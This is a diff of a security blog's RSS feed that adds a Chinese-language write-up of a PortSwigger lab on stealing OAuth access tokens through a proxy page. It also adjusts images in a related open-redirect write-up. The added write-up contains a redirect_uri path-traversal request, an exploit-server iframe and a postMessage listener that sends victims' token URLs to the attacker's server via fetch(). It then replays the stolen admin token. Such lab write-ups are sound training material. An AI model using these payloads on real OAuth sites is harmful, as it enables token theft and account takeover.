+&lt;/ol></content></item><item><title>[Write Up]Lab: Stealing OAuth access tokens via a proxy page</title><link>/posts/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page/</link><pubDate>Sun, 22 Dec 2024 13:33:08 +0800</pubDate><guid>/posts/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>登录，并点击&lt;code>Continue&lt;/code>，出现以下Request序列
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=cefvv41oq0lwkcnh9d5ym&amp;amp;redirect_uri=https://0a89006d035badd680d0268d006900e0.web-security-academy.net/oauth-callback&amp;amp;response_type=token&amp;amp;nonce=1926909250&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/oU4KNwQuladMWbXc9VYTn&amp;#34;&amp;gt;/interaction/oU4KNwQuladMWbXc9VYTn&amp;lt;/a&amp;gt;.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;wiener&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;m0ucLGYyLJMSBfxUNV7Sgq0Ye9JMnbtL&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Peter Wiener&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;wiener@hotdog.com&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>重放第一个Request，并修改&lt;code>redirect_uri&lt;/code>，确认参数确实存在目录遍历攻击
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=cefvv41oq0lwkcnh9d5ym&amp;amp;redirect_uri=https://0a89006d035badd680d0268d006900e0.web-security-academy.net/oauth-callback../&amp;amp;response_type=token&amp;amp;nonce=1926909250&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/D_c8k2xC9RZiz4ofxVH4d&amp;#34;&amp;gt;/interaction/D_c8k2xC9RZiz4ofxVH4d&amp;lt;/a&amp;gt;.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到主页，随机点选一篇文章的&lt;code>View post&lt;/code>，可看到有下列Request，从&lt;code>Javascript&lt;/code>代码使用&lt;code>postMessage()&lt;/code>方法将&lt;code>window.location.href&lt;/code>属性发送到其父窗口，通过此特性将&lt;code>redirect_url&lt;/code>和&lt;code>/post/comment/comment-form&lt;/code>请求结合使用
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /post/comment/comment-form &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a89006d035badd680d0268d006900e0.web-security-academy.net&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">parent&lt;/span>.&lt;span style="color:#a6e22e">postMessage&lt;/span>({&lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;onload&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span>}, &lt;span style="color:#e6db74">&amp;#39;*&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">submitForm&lt;/span>(&lt;span style="color:#a6e22e">form&lt;/span>, &lt;span style="color:#a6e22e">ev&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ev&lt;/span>.&lt;span style="color:#a6e22e">preventDefault&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">formData&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">FormData&lt;/span>(document.&lt;span style="color:#a6e22e">getElementById&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;comment-form&amp;#34;&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">hashParams&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">URLSearchParams&lt;/span>(window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">hash&lt;/span>.&lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {};
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">formData&lt;/span>.&lt;span style="color:#a6e22e">forEach&lt;/span>((&lt;span style="color:#a6e22e">v&lt;/span>, &lt;span style="color:#a6e22e">k&lt;/span>) =&amp;gt; &lt;span style="color:#a6e22e">o&lt;/span>[&lt;span style="color:#a6e22e">k&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">v&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">hashParams&lt;/span>.&lt;span style="color:#a6e22e">forEach&lt;/span>((&lt;span style="color:#a6e22e">v&lt;/span>, &lt;span style="color:#a6e22e">k&lt;/span>) =&amp;gt; &lt;span style="color:#a6e22e">o&lt;/span>[&lt;span style="color:#a6e22e">k&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">v&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">parent&lt;/span>.&lt;span style="color:#a6e22e">postMessage&lt;/span>({&lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;oncomment&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">content&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>}, &lt;span style="color:#e6db74">&amp;#39;*&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">reset&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">/script&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>，并在Body构造&lt;code>&amp;lt;iframe src=&amp;quot;https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&amp;amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&amp;amp;response_type=token&amp;amp;nonce=-1552239120&amp;amp;scope=openid%20profile%20email&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>，并在其下方新增&lt;code>javascript&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> window.&lt;span style="color:#a6e22e">addEventListener&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;message&amp;#39;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> encodeURIComponent(&lt;span style="color:#a6e22e">e&lt;/span>.&lt;span style="color:#a6e22e">data&lt;/span>.&lt;span style="color:#a6e22e">data&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }, &lt;span style="color:#66d9ef">false&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">/script&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img alt="Exploit bdoy" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-2.jpg">&lt;/li>
+&lt;li>点击最下方的&lt;code>Store、Deliver expolit to victim&lt;/code>后点击&lt;code>Access log&lt;/code>
+&lt;img alt="Access log" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-3.jpg">&lt;/li>
+&lt;li>重放步骤1的第二个Request，并将&lt;code>Authorization: Bearer&lt;/code>参数更换为Admin的&lt;code>access_token&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Bearer &lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;administrator&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;sN3GREEdlVzIV4u4F34rM6sRzXTkj6J7&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Administrator&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;administrator@normal-user.net&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>回到主页，点击最上方的&lt;code>Submit solution&lt;/code>，并输入apikey内容即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Stealing OAuth access tokens via an open redirect</title><link>/posts/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect/</link><pubDate>Thu, 19 Dec 2024 21:24:42 +0800</pubDate><guid>/posts/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
@@ -51,11 +305,11 @@
 &lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>将&lt;code>Next post&lt;/code>的uri利用于目录遍历攻击处，点击最上方&lt;code>Go to exploit server&lt;/code>，并在Body构造&lt;code>'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&amp;amp;response_type=token&amp;amp;nonce=321443983&amp;amp;scope=openid%20profile%20email'&lt;/code>
-&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-3.jpg">&lt;/p>
+![Exploit bdoy]](/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-3.jpg)&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>点击最下方的&lt;code>Store&lt;/code>、&lt;code>Deliver expolit to victim&lt;/code>后点击&lt;code>Access log&lt;/code>
-&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-4.jpg">&lt;/p>
+&lt;img alt="Access log" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-4.jpg">&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>重放步骤2请求，并将&lt;code>Authorization: Bearer&lt;/code>参数更换为Admin的&lt;code>access_token&lt;/code>&lt;/p>
